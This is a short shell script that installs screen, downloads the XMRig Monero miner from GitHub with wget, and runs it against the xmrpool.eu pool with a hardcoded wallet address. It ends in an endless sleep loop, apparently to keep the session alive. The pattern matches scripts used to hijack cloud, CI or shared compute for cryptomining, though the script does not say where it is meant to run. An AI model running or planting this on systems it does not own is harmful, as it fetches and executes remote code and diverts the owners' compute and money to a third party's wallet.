#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz
tar xf xmrig-6.16.3-linux-x64.tar.gz
./xmrig-6.16.3/xmrig -o xmrpool.eu:9999 -u 45R46vYSozjFtZt39hJB1n6DwTaZE4dcjfpgL35iHyp1BZXpUQtUSvyYYH63kw6crxANAqjQFUxmbGwGsJJ1qzvKPDeWef2 -k --tls
while [ 1 ]; do
sleep 3
done
sleep 998
